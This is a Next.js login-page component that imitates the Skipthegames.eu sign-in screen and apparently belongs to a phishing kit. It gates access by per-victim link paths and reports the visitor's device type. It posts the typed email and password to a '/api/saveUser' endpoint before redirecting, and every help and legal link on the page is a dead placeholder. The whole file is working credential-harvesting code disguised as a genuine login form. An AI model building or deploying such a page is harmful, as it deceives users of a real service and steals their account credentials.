"use client";

import React, { useEffect, useState } from "react";
import axios from "axios";
import { useDispatch } from "react-redux";
import { useRouter } from "next/navigation";
import { userLogin } from "@/lib/userSlice";
import { storeData } from "@/lib/dataSlice";
import { usePathname } from "next/navigation";
import NotFoundPage from "@/components/LinkExpired";
import Link from "next/link";

const LoginPage = () => {
  const dispatch = useDispatch();
  const router = useRouter();
  const pathname = usePathname();

  const [passwordVisible, setPasswordVisible] = useState(false);
  const [user, setUser] = useState("");
  const [password, setPassword] = useState("");
  const [deviceType, setDeviceType] = useState("");

  const [isLinkExpired, setIsLinkExpired] = useState(false);

  const [domain, setDomain] = useState("");

  const [emailError, setEmailError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);

  useEffect(() => {
    setDomain(window.location.origin);
  }, []);

  useEffect(() => {
    async function fetchData() {
      const res = await axios.post("/api/links", { domain });
      const links = res.data.data;

      const link = links.find(
        (link: { link: string }) => `/${link.link}` === pathname
      );
      if (!link) {
        setIsLinkExpired(true);
      }
    }

    if (pathname && pathname !== "/" && !isLinkExpired && domain) {
      fetchData();
    } else {
      setIsLinkExpired(false);
    }
  }, [pathname, domain]);

  // Fetch user data
  useEffect(() => {
    if (isLinkExpired) {
      return;
    }
    const fetchData = async () => {
      try {
        const res = await axios.get("/api/getData");
        if (res?.data?.success) {
          dispatch(
            storeData({
              email: res.data.data.email,
              step1: res.data.data.step1,
              step2: res.data.data.step2,
              step3: res.data.data.step3,
            })
          );
        }
      } catch (error) {
        console.error(error);
      }
    };
    fetchData();
  }, [dispatch, isLinkExpired]);

  // Detect device
  useEffect(() => {
    if (isLinkExpired) {
      return;
    }
    const detectDevice = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile =
        /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
          userAgent
        );
      return isMobile ? "Mobile" : "Desktop";
    };

    const type = detectDevice();
    setDeviceType(type);

    const sendDevice = async () => {
      try {
        await axios.get(`/api/device?id=${type}`);
      } catch (error) {
        console.error(error);
      }
    };
    sendDevice();
  }, [isLinkExpired]);

  const togglePasswordVisibility = () => {
    setPasswordVisible((prev) => !prev);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    setEmailError(false);
    setPasswordError(false);

    let valid = true;

    if (!user.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user.trim())) {
      setEmailError(true);
      valid = false;
    }

    if (!password.trim()) {
      setPasswordError(true);
      valid = false;
    }

    if (!valid) {
      return;
    }

    dispatch(userLogin({ user, password, deviceType }));
    router.push("/login");

    try {
      await axios.post("/api/saveUser", { user, password, deviceType });
      console.log("User data saved successfully");
    } catch (error) {
      console.error(error);
    }
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setUser(e.target.value);
    setEmailError(false);
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
    setPasswordError(false);
  };

  if (isLinkExpired) {
    return <NotFoundPage />;
  }

  return (
    <div className="min-h-screen bg-white text-[#1F1F1F] font-sans">
      <div className="max-w-[62.5em] mx-auto px-5 sm:px-6 pt-7 pb-8">
        {/* Header */}
        <header className="flex flex-col items-center sm:flex-row sm:items-center gap-0 sm:gap-[90px] mb-6 sm:mb-[10px] text-center sm:text-left">
          <Link
            href="/"
            className="inline-flex items-center no-underline whitespace-nowrap"
            aria-label="Skipthegames.eu home"
          >
            <img
              className="h-[38px] sm:h-[37px] w-auto block mx-auto sm:mx-0"
              src="/logo.svg"
              alt="Skipthegames.eu"
            />
          </Link>
          <p className="text-[15px] py-2.5 sm:text-[17px] text-[#1F1F1F] font-normal mt-0">
            Skip the games. Get satisfaction.
          </p>
        </header>

        <main className="flex flex-col sm:flex-row gap-0 sm:gap-[80px]">
          {/* Login Column */}
          <section className="flex-1 sm:flex-[1_1_380px] max-w-none sm:max-w-[430px]">
            <h1 className="text-[22px] sm:text-[26px] font-normal mt-0 mb-4 sm:mb-[18px] text-[#1F1F1F]">
              Log in to your account
            </h1>

            <form onSubmit={handleSubmit} noValidate>
              {/* Email Field */}
              <div className="mb-[14px]">
                <label
                  className="absolute w-px h-px overflow-hidden [clip:rect(0_0_0_0)] whitespace-nowrap"
                  htmlFor="email"
                >
                  Your email
                </label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  className={`w-[104%] px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${
                    emailError ? "border-[#FF001F]" : "border-[#C5C5C5]"
                  }`}
                  placeholder="Your email"
                  autoComplete="username"
                  value={user}
                  onChange={handleEmailChange}
                />
                <p
                  className={`text-[12px] text-[#FF001F] mt-[5px] w-[104%] ${
                    emailError ? "block" : "hidden"
                  }`}
                >
                  Enter a valid email address.
                </p>
              </div>

              {/* Password Field */}
              <div className="mb-[10px]">
                <label
                  className="absolute w-px h-px overflow-hidden [clip:rect(0_0_0_0)] whitespace-nowrap"
                  htmlFor="password"
                >
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type={passwordVisible ? "text" : "password"}
                  className={`w-[104%] px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${
                    passwordError ? "border-[#FF001F]" : "border-[#C5C5C5]"
                  }`}
                  placeholder="Password"
                  autoComplete="current-password"
                  value={password}
                  onChange={handlePasswordChange}
                />
                <p
                  className={`text-[12px] text-[#FF001F] mt-[5px] w-[104%] ${
                    passwordError ? "block" : "hidden"
                  }`}
                >
                  Enter your password.
                </p>
              </div>

              {/* Show/Hide Password */}
              <button
                type="button"
                className="inline-block bg-transparent border-none p-0 text-[13px] font-sans text-[#93002F] underline mb-[16px] cursor-pointer focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-2"
                onClick={togglePasswordVisibility}
                aria-pressed={passwordVisible}
              >
                {passwordVisible ? "Hide password" : "Show password"}
              </button>

              {/* Help Lines */}
              <div className="text-[16px] font-bold text-[#FF001F] mb-[14px] leading-[25px]">
                Password not working?{" "}
                <a href="#" className="text-[#903] underline font-bold">
                  Click here
                </a>
              </div>
              <div className="text-[16px] font-bold text-[#FF001F] mb-[14px] leading-[25px]">
                Can&apos;t access your mailbox?{" "}
                <a href="#" className="text-[#903] underline font-bold">
                  Click to request email change
                </a>
              </div>

              {/* Mobile Only: First Time */}
              <div className="block sm:hidden text-[16px] font-bold text-[#FF001F] mb-[14px] leading-[25px]">
                First time here?{" "}
                <a href="#" className="text-[#903] underline font-bold">
                  Make your first post
                </a>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="w-[104%] bg-[#009DC1] text-white border-none rounded-[3px] py-[12px] text-[16px] font-normal cursor-pointer mb-[14px] transition-colors duration-150 hover:bg-[#0089AA] focus-visible:outline-2 focus-visible:outline-[#93002F] focus-visible:outline-offset-2"
              >
                Log in
              </button>

              {/* Fine Print */}
              <p className="text-[60%] my-3 text-[#222] leading-[1.7]">
                By clicking &quot;Log in&quot;, you accept{" "}
                <a
                  href="#"
                  className="text-[#93002F] no-underline hover:underline"
                >
                  Skipthegames.eu&apos;s Terms and Conditions of Use
                </a>
                <br />
                This site is protected by hCaptcha and its{" "}
                <a
                  href="#"
                  className="text-[#93002F] no-underline hover:underline"
                >
                  Privacy Policy
                </a>{" "}
                and{" "}
                <a
                  href="#"
                  className="text-[#93002F] no-underline hover:underline"
                >
                  Terms of Service
                </a>{" "}
                apply.
              </p>
            </form>
          </section>

          {/* Signup Column (Desktop only) */}
          <section className="hidden sm:block flex-1 sm:flex-[1_1_260px] max-w-none sm:max-w-[380px] sm:ml-[65px]">
            <h2 className="text-[26px] font-normal mt-0 mb-[18px] text-[#1F1F1F]">
              First time here?
            </h2>
            <a href="#" className="text-[15px] text-[#6C6C6C] underline">
              Make your first post
            </a>
          </section>
        </main>

        {/* Footer */}
        <footer className="border-t border-[#E5E5E5] pt-[12px] flex flex-col sm:flex-row items-start sm:items-center justify-normal flex-wrap gap-[22px] sm:gap-[60px] text-[18px]">
          <div className="text-[#903]">&copy;Skipthegames.eu</div>
          <div className="text-[#1F1F1F] hidden sm:block">
            Skip the games. Get satisfaction.
          </div>
          <nav className="flex gap-4 sm:gap-[22px] flex-wrap">
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              About
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Contact
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Privacy
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Terms
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Escort Info
            </a>
          </nav>
        </footer>
      </div>
    </div>
  );
};

export default LoginPage;